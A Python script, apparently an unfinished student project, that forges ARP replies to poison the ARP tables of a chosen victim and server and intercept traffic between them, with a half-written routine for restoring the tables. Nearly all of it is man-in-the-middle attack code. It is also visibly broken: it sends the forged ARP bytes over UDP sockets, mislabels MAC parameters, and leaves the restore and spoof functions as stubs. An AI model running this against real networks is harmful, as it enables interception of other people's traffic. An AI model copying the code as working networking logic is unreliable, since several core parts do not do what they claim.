#!/home/luis/.venv/inquisitor/bin/python3

# ####!/usr/local/bin/python3
# ####!/home/luis/anaconda3/envs/42AI-lcasado-/bin/python3

import signal
import sys
import socket
import argparse
import uuid
import libpcap
import scapy.all as scapy


def create_argument_parser():

    def correct_ip(text):
        """
        Verifies that the text fits an ipv4 IP address
        https://datatracker.ietf.org/doc/html/rfc4001

        Four integers reanging 0..255
        Argument:
            text: string
        """
        text_numbers = text.split('.')
        try:
            if len(text_numbers) == 4:
                # IP has 4 bytes
                for text_number in text_numbers:
                    num = int(text_number)
                    if not (0 <= num <= 255):
                        raise ValueError
                # all bytes inside range
                return text
            else:
                raise ValueError
        except ValueError:
            msg = f"{text} does not correspon to a correct IPv4 address"
            parser.error(msg)

    def correct_mac(text):
        """
        Traditional MAC addresses are 12-digit (6 bytes or 48 bits)
        hexadecimal numbers.

        By convention, these addresses are usually written in one of
        the following three formats, although there are variations:
        MM:MM:MM:SS:SS:SS
        MM-MM-MM-SS-SS-SS
        MMM.MMM.SSS.SSS

        Identifies which notation uses the MAC address and checks
        that each chunck has ony hexadecimal chars.
        """
        def validate_hex(elems: list, size=2) -> bool:
            for elem in elems:
                if len(elem) == size:
                    for letter in elem.upper():
                        if letter not in '0123456789ABCDEF':
                            raise ValueError
                else:
                    raise ValueError
            return True

        try:
            text_numbers = text.split(':')
            if len(text_numbers) == 6:
                # MM:MM:MM:SS:SS:SS
                return text if validate_hex(text_numbers) else None
            else:
                text_numbers = text.split('-')
                if len(text_numbers) == 6:
                    # MM-MM-MM-SS-SS-SS
                    return text if validate_hex(text_numbers) else None
                else:
                    text_numbers = text.split('.')
                    if len(text_numbers) == 4:
                        # MMM.MMM.SSS.SSS
                        return text if validate_hex(text_numbers, 3) else None
                    else:
                        raise ValueError
        except ValueError:
            msg = f"{text} does not correspon to a correct MAC address"
            parser.error(msg)

    msg = """
    This python script will send incorrect ARP response packets to source and
    target hosts.
    Then intercepts traffic between source and target.
    Before exit, restablish source and target arp tables to the original state
    """
    parser = argparse.ArgumentParser(
        prog='arpspoof',
        description=msg,
        epilog='Este es el final de la ayuda',
        usage="""
    ./arpspoof [-v] -s IP -r MAC -t IP -g MAC
        """
        )
    parser.add_argument('-v', '--verbose',
                        help='Shows all FTP traffic and not just filenames',
                        action='store_true')

    parser.add_argument('-s', '--sip',
                        required=True,
                        help=f'Source IP address',
                        type=correct_ip)
    parser.add_argument('-r', '--smacadd',
                        required=True,
                        help=f'Source Mac Addres',
                        type=correct_mac)
    parser.add_argument('-t', '--tip',
                        required=True,
                        help='Target IP address',
                        type=correct_ip)
    parser.add_argument('-g', '--tmacadd',
                        required=True,
                        help='Target Mac address',
                        type=correct_mac)

    return parser


def all_in_network(IPv4_a1, IPv4_a2, IPv4_a3) -> bool:
    a1_octes = IPv4_a1.split('.')
    a2_octes = IPv4_a2.split('.')
    a3_octes = IPv4_a3.split('.')

    if a1_octes[0] == a2_octes[0] == a3_octes[0]:
        # first octect in 3 ips are equal
        if a1_octes[1] == a2_octes[1] == a3_octes[1]:
            # second octect in 3 ips are equal
            if a1_octes[2] == a2_octes[2] == a3_octes[2]:
                # third octect in 3 ips are equal
                # i simple conclude all 3 are in same network
                # without considering any mask. TODO:
                return True
            else:
                return False

        else:
            return False
    else:
        return False


############################################################################
# Helper functions to construct packets
############################################################################


def mac_to_bytes(mac: str) -> bytes:
    """
    Translates a IP address into a bytes array
    """
    return bytes.fromhex(mac.replace(':', ''))


def ip_to_bytes(ip: str) -> bytes:
    """
    Translates a IP address into a bytes array
    """
    elems = ip.split('.')
    result = b''
    for elem in elems:
        elem_int = int(elem)
        elem_hex = hex(elem_int)[2:]
        if 0 <= elem_int <= 15:
            elem_hex = '0' + elem_hex
        elem_byte = bytes.fromhex(elem_hex)
        result += elem_byte
    return result


def show_packet(pack: bytes):
    block = pack.hex()
    c=1
    sep= ' '
    for n in range(0,len(block),4):
        print(block[n:n+4],' ', end=sep)
        c = c + 1
        if c <= 7:
            sep = ' '
        else:
            c = 0
            sep = '\n'
    print('\n',"-"*46) 


def arp_reply(att_mac: str, sen_ip: str, tar_mac: str, tar_ip: str) -> bytes:
    """
    This simulates a reply to a previous inexistent request comming from the
    the victim(client) or from the server that wants
    to know mac address of either of the server or the (client) victim

    It is a reply send by the attackant on behalf of the one that reveived
    the request.
    """

    hardware_type = b'\x00\x01'
    # The type of MAC address being sought
    # The EtherType value for Xerox PUP is 0x0400 (legacy)
    # The "hardware type" field specifies the type of network interface
    # hardware being used. It is represented by a 16-bit value.
    # Some commonly used values for the hardware type field include:
    # 1: Ethernet (10Mb)
    # 6: IEEE 802 networks (Ethernet)
    # 15: Frame Relay
    # 16: Asynchronous Transfer Mode (ATM)
    # 17: HDLC

    protocol_type = b'\x08\x00'  # The Layer-3 protocol in use
    # The "protocol type" field indicates the network protocol being used
    # in the higher layer of the OSI model. It is a 16-bit value.
    # The most common protocol types encountered in ARP packets are:
    # 0x0800: Internet Protocol version 4 (IPv4)
    # 0x0806: Address Resolution Protocol (ARP)
    # 0x86DD: Internet Protocol version 6 (IPv6)
    # 0x8035: Reverse Address Resolution Protocol (RARP)
    # 0x809B: AppleTalk
    hardware_Size = b'\x06'             # The length of the MAC address
    protocol_size = b'\x04'
    opcode = b'\x00\x02'                # Type of ARP message 2=reply 1=request
    sender_MAC = mac_to_bytes(att_mac)  # Attackant MAC address
    sender_IP = ip_to_bytes(sen_ip)     # who received request packet
    target_MAC = mac_to_bytes(tar_mac)  # who sent request paquet.
    target_IP = ip_to_bytes(tar_ip)

    part_a = hardware_type + protocol_type + hardware_Size + protocol_size
    part_b = opcode + sender_MAC + sender_IP + target_MAC + target_IP
    return part_a + part_b


def ether_pack(src_mac: str, dst_mac: str, payload: bytes, t: bytes) -> bytes:
    """
    Constructs an ether Pack
    """
    dest_mac = mac_to_bytes(src_mac)
    sour_mac = mac_to_bytes(dst_mac)
    return dest_mac + sour_mac + t + payload


############################################################################
# Helper functions to poison and restablish server and victim ARP Tables
############################################################################
def poison_tables(att_mac: str, att_ip: str,   # Attackant MAC & IP
                  sou_mac: str, sou_ip: str,   # server MAC & IP
                  des_mac: str, des_ip: str):  # victim MAC & IP

    # Spoofed Arp Reply sent to the victim in response to
    # its request about server mac address
    arp_poi_vic = arp_reply(att_mac=att_mac,           # Attackant MAC
                            sen_ip=sou_ip,             # server IP
                            tar_mac=des_mac,           # victim MAC
                            tar_ip=des_ip)             # victim IP

    # Spoofed Arp Reply sent to the Server in response to
    # its request about victim mac address
    arp_poi_ser = arp_reply(att_mac=att_mac,           # Attackant MAC
                            sen_ip=des_ip,             # victim IP
                            tar_mac=sou_mac,           # server MAC
                            tar_ip=sou_ip)             # server IP

    # ether pack to poison victim arp table
    eth_poi_vic = ether_pack(dst_mac=des_mac,           # victim MAC
                             src_mac=att_mac,           # attackant MAC
                             payload=arp_poi_vic,
                             t=b'\x08\x06')             # ARP TYpe

    # ether pack to poison server arp table
    eth_poi_ser = ether_pack(dst_mac=sou_mac,           # server MAC
                             src_mac=att_mac,           # attackant MAC
                             payload=arp_poi_ser,
                             t=b'\x08\x06')             # ARP TYpe
    

    """
    #with socket.socket(socket.AF_PACKET, socket.SOCK_DGRAM) as rs:
        rs.bind(('eth0',8000))
        sentbytes = rs.send(arp_poi_vic)
        print("Sent packet of length %d bytes" % sentbytes)
        sentbytes = rs.send(eth_poi_ser)
        print("Sent packet of length %d bytes" % sentbytes)
    """
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sk:
    #with socket.socket(socket.AF_INET, socket.SOCK_DGRAM,proto=) as sk:
        sk.connect((des_ip, 4000))
        sk.sendall(arp_poi_vic)
        scapy.hexdump(arp_poi_vic)
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sk:
        sk.connect((sou_ip, 4000))
        sk.sendall(eth_poi_ser)
        scapy.hexdump(arp_poi_vic)
    

def amend_tables(att_mac: str, att_ip: str,   # Attackant MAC & IP
                 sou_mac: str, sou_ip: str,   # server MAC & IP
                 des_mac: str, des_ip: str):  # vistim MAC & IP

    # Regular Arp Reply sent to the victim in response to
    # its request about server mac address
    arp_reg_vic = arp_reply(att_mac=sou_mac,            # server MAC
                            sen_ip=sou_ip,              # server IP
                            tar_mac=des_mac,            # victim MAC
                            tar_ip=des_ip)              # victim IP

    # Regular Arp Reply sent to the Server in response to
    # its request about victim mac address
    arp_reg_ser = arp_reply(att_mac=des_mac,            # victim MAC
                            sen_ip=des_ip,              # victim IP
                            tar_mac=sou_mac,            # server MAC
                            tar_ip=sou_ip)              # server IP

    # ether pack to correct victim arp table
    eth_reg_vic = ether_pack(dst_mac=des_mac,           # victim MAC
                             src_mac=att_mac,           # attackant MAC
                             payload=arp_reg_vic,
                             t=b'\x08\x06')             # ARP TYpe

    # ether pack to correc server arp table
    eth_reg_ser = ether_pack(dst_mac=sou_mac,           # server MAC
                             src_mac=att_mac,           # attackant MAC
                             payload=arp_reg_ser,
                             t=b'\x08\x06')             # ARP TYpe


def spoof():
    pass

def restore():
    pass

def signal_handler(signal, frame):
    print("CTRL+C detected. Exiting gracefully...")
    print(" restablishinf ARP Tabel to is otiginal state")
    # Perform any necessary cleanup here
    sys.exit(0)




# Register the signal handler
signal.signal(signal.SIGINT, signal_handler)


if __name__ == "__main__":
    parser = create_argument_parser()
    args = parser.parse_args(sys.argv[1:])
    print("Estos son mis argumentos ", args)
    hostname = socket.gethostname()
    att_hex = hex(uuid.getnode())                      # Attackant
    att_aux=''
    for n in range(2,len(att_hex), 2):
        att_aux = att_aux + att_hex[n: n+2] +':'
    att_mac = att_aux[:-1]
    print(att_mac)    
    att_ip = socket.gethostbyname(hostname)
    sou_ip = args.sip
    sou_mac = args.smacadd
    des_ip = args.tip
    des_mac = args.tmacadd
    if all_in_network(att_ip, sou_ip, des_ip):
        spoof = True   # Spoofing is posible
    else:
        spoof = False
        msg = f"source IP {sou_ip}, target IP {des_ip} and {att_ip} "
        msg = msg + "not in same network"
        print(msg)

    # Your main script logic goes here
    #print(get_mac())

    while spoof:
        # Perform your tasks
        # ...
        poison_tables(att_mac=att_mac, att_ip=att_ip,        # Attackant MAC & IP
                     sou_mac=sou_mac, sou_ip=sou_ip,        # server MAC & IP
                     des_mac=des_mac, des_ip=des_ip)        # vistim MAC & IP




        # Add a delay or use a blocking operation to keep the script running
        # For example:
        try:
            # Do something that takes time
            pass
        except KeyboardInterrupt:
            # Handle CTRL+C during the blocking operation, if required
            print("CTRL+C detected during the blocking operation.")
            # Perform any necessary cleanup here
            
            amend_tables(att_mac=att_mac, att_ip=att_ip,         # Attackant MAC & IP
                         sou_mac=sou_mac, sou_ip=sou_ip,         # server MAC & IP
                         des_ip=des_ip, des_mac=des_mac)         # vistim MAC & IP

            sys.exit(0)


